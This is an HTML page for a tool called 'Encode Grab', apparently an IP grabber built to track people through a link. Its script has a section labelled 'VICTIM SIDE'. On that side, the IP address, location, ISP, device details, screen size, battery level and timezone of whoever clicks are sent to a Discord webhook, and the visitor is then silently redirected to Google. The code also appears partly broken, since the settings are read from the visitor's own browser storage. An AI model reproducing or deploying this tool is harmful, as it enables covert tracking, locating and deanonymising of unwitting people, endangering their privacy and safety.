<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Encode Grab</title>
  <style>
    body { margin:0; background:#000; color:#0f0; font-family:'Courier New'; padding:20px; text-align:center; }
    .card { background:#111; border:2px solid #0f0; border-radius:12px; padding:25px; max-width:500px; margin:auto; }
    h1 { margin:0 0 15px; font-size:1.8rem; }
    input, button { width:100%; padding:12px; margin:8px 0; background:#000; border:1px solid #0f0; color:#0f0; border-radius:8px; font-size:1rem; }
    button { background:#0f0; color:#000; font-weight:bold; cursor:pointer; }
    label { display:flex; align-items:center; justify-content:space-between; margin:12px 0; font-size:1rem; }
    input[type="checkbox"] { width:auto; transform:scale(1.3); }
    #link { background:#000; padding:15px; border-radius:8px; word-break:break-all; margin:15px 0; font-weight:bold; font-size:1.1rem; }
    .footer { margin-top:40px; font-size:0.8rem; opacity:0.6; }
  </style>
</head>
<body>
  <div class="card">
    <h1>Encode Grab</h1>
    <p>Generate link. They click. You know.</p>

    <input id="webhook" placeholder="https://discord.com/api/webhooks/..." />

    <label>IP + Location <input type="checkbox" id="ip" checked></label>
    <label>PC Info (Device, Screen, etc) <input type="checkbox" id="pc" checked></label>

    <button onclick="generate()">GENERATE LINK</button>

    <div id="result" style="display:none;">
      <p><strong>Send this:</strong></p>
      <div id="link"></div>
      <button onclick="copy()">COPY LINK</button>
    </div>
  </div>

  <div class="footer">© 2025 – No trace. Just truth.</div>

  <script>
    function rand() { return Math.random().toString(36).substr(2, 10); }

    function generate() {
      const webhook = document.getElementById("webhook").value.trim();
      if (!webhook.includes("discord.com/api/webhooks")) return alert("Enter valid Discord webhook.");

      const config = {
        w: webhook,
        ip: document.getElementById("ip").checked,
        pc: document.getElementById("pc").checked
      };

      const id = rand();
      const link = `${location.origin}/?id=${id}`;
      localStorage.setItem(`cfg_${id}`, JSON.stringify(config));

      document.getElementById("link").innerText = link;
      document.getElementById("result").style.display = "block";
    }

    function copy() {
      const link = document.getElementById("link").innerText;
      navigator.clipboard.writeText(link);
      alert("Copied!");
    }

    // === VICTIM SIDE ===
    if (location.search) {
      const params = new URLSearchParams(location.search);
      const id = params.get("id");
      const cfg = JSON.parse(localStorage.getItem(`cfg_${id}`) || "{}");
      if (!cfg.w) { location.href = "https://google.com"; return; }

      document.body.innerHTML = `<h2 style="color:#0f0;margin-top:100px;">Loading...</h2>`;

      (async () => {
        const embed = { title: "NEW HIT", color: 65280, fields: [], timestamp: new Date().toISOString() };

        // IP + GEO
        if (cfg.ip) {
          try {
            const data = await (await fetch("https://ipapi.co/json/")).json();
            embed.fields.push(
              { name: "IP", value: data.ip, inline: true },
              { name: "Location", value: `${data.city}, ${data.country_name}`, inline: true },
              { name: "ISP", value: data.org || "Unknown", inline: true }
            );
          } catch (e) {}
        }

        // PC INFO
        if (cfg.pc) {
          const battery = await navigator.getBattery?.() || {};
          embed.fields.push(
            { name: "Device", value: navigator.userAgent.slice(0, 100), inline: false },
            { name: "Screen", value: `${screen.width}x${screen.height}`, inline: true },
            { name: "Battery", value: battery.level ? Math.round(battery.level * 100) + "%" : "N/A", inline: true },
            { name: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true }
          );
        }

        // SEND TO DISCORD
        await fetch(cfg.w, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ embeds: [embed] })
        });

        // Redirect silently
        setTimeout(() => location.replace("https://google.com"), 800);
      })();
    }
  </script>
</body>
</html>
